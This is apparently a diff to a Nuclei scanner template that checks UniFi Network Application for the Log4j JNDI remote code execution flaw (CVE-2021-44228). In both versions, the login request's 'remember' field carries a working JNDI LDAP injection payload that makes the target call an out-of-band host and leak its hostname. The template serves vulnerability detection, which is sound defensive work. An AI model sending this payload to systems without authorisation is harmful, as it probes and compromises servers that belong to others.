@@ -1,16 +1,29 @@
 id: unifi-network-log4j-rce
 
 info:
-  name: UniFi Network Log4j JNDI RCE
+  name: UniFi Network Application - Remote Code Execution (Apache Log4j)
   author: KrE80r
   severity: critical
-  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in an impacted UniFi Network Application .
+  description: |
+    UniFi Network Application is susceptible to a critical vulnerability in Apache Log4j (CVE-2021-44228) that may allow for remote code execution in an impacted implementation.
   reference:
     - https://community.ui.com/releases/UniFi-Network-Application-6-5-55/48c64137-4a4a-41f7-b7e4-3bee505ae16e
     - https://twitter.com/sprocket_ed/status/1473301038832701441
-  tags: rce,log4j,ubnt,unifi,oast,jndi,network
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
   metadata:
+    max-request: 1
     shodan-query: http.title:"UniFi Network"
+    verified: true
+  tags: cve,cve2021,rce,log4j,ubnt,unifi,oast,jndi,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -21,23 +34,33 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage
 
-        {"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.{{interactsh-url}}}","strict":true}
+        {"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}
 
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
-          - "dns"  # Confirms the DNS Interaction
+          - "dns" # Confirms the DNS Interaction
 
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
       - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
         part: interactsh_request
+
+      - type: regex
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
